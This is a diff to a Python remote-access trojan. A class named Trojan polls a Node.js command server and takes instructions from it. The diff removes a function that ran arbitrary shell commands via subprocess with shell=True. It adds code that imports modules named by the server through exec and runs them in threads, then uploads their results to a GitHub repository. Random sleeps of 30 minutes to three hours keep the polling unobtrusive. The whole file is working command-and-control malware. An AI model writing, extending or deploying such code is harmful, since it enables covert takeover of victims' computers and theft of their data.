@@ -6,7 +6,6 @@ import random
 import sys
 import threading
 import time
-import subprocess
 import requests
 from datetime import datetime
 
@@ -33,13 +32,13 @@ class Trojan:
         config_json = get_file_contents('config', self.config_file, self.repo)
         return json.loads(base64.b64decode(config_json))
 
-    def get_nodejs_config(self):
+    def get_nodejs_commands(self):
         try:
             response = requests.get(f"{self.node_server_url}/config")
             return response.json()
         except requests.exceptions.RequestException as e:
-            print(f"[*] Failed to get config from Node.js server: {e}")
-            return None
+            print(f"[*] Failed to get commands from Node.js server: {e}")
+            return {"commands": [], "stop": False}
 
     def send_command_result(self, command, result):
         try:
@@ -51,24 +50,6 @@ class Trojan:
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to send command result to Node.js server: {e}")
 
-    def update_status(self, status):
-        try:
-            payload = {
-                "id": self.id,
-                "status": status
-            }
-            requests.post(f"{self.node_server_url}/status", json=payload)
-        except requests.exceptions.RequestException as e:
-            print(f"[*] Failed to update status on Node.js server: {e}")
-
-    def execute_command(self, command):
-        try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            result = result.decode('utf-8')
-        except subprocess.CalledProcessError as e:
-            result = e.output.decode('utf-8')
-        self.send_command_result(command, result)
-
     def module_runner(self, module):
         result = sys.modules[module].run()
         self.store_module_result(result)
@@ -79,31 +60,29 @@ class Trojan:
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
         self.repo.create_file(remote_path, message, bindata)
 
+    def run_modules_from_commands(self, commands):
+        for command in commands:
+            if command['module'] not in sys.modules:
+                exec("import %s" % command['module'])
+            thread = threading.Thread(target=self.module_runner, args=(command['module'],))
+            thread.start()
+            time.sleep(random.randint(1, 10))
+
     def run(self):
         while self.running:
-            # Fetch configuration from GitHub
-            github_config = self.get_github_config()
-
             # Fetch real-time commands from Node.js server
-            nodejs_config = self.get_nodejs_config()
+            nodejs_commands = self.get_nodejs_commands()
 
-            if nodejs_config:
-                if nodejs_config.get('stop'):
-                    self.running = False
-                    self.update_status("Trojan stopped.")
-                    break
+            if nodejs_commands.get('stop'):
+                self.running = False
+                self.send_command_result("stop", "Trojan stopped.")
+                print("[*] Trojan stopped.")
+                break
 
-                # Execute commands from Node.js server
-                for command in nodejs_config.get('commands', []):
-                    self.execute_command(command)
+            # Run modules based on Node.js commands
+            self.run_modules_from_commands(nodejs_commands.get('commands', []))
 
-            # Run modules based on GitHub config
-            for task in github_config.get('modules', []):
-                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
-                thread.start()
-                time.sleep(random.randint(1, 10))
-
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(30*60, 3*60*60))  # Sleep before checking for new commands
 
 class GitImporter:
     def __init__(self):
